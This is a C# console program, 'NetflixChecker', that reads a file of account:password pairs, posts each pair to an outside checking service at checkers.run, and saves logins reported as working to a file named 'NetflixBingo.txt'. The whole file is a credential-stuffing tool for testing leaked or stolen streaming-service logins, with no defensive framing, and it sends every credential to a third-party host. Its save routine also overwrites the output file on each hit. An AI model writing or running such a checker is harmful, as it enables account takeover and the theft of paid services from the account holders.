﻿using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading;

namespace NetflixChecker
{
    //CodeItMyWay

    class Program
    {
        private static readonly HttpClient client = new HttpClient();
        
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");
            //get acounts
            string[] lines = System.IO.File.ReadAllLines(@"C:\Users\s2ad\Downloads\nn.txt");
           foreach(string l in lines)
            {
                MakeReqAsync(l);
                Thread.Sleep(600);
            }
            
            Console.ReadLine();
        }

        async static System.Threading.Tasks.Task MakeReqAsync(string acount)
        {
            var values = new Dictionary<string, string>
             {
                { "account", acount }
            };

            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync("https://checkers.run/nf-free/check-account", content);

            var responseString = await response.Content.ReadAsStringAsync();
            Account m = JsonConvert.DeserializeObject<Account>(responseString);
            if(m.working == "false" && acount.Split(':')[1] != "banana69" && acount.Split(':')[1] != "pacman00")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Working : " + m.working + " Screen : " + m.screens + " Acoumpt : " + acount);

            }else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Working : " + m.working + " Screen : " + m.screens + " Acoumpt : " + acount);
                saveToFile(acount);
            }
        }

       static void  saveToFile(string account)
        {
            string path = @"C:\Users\s2ad\Desktop\NetflixBingo.txt";
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(path))
            {    
                 file.WriteLine(account);
            }

        }


    }
}
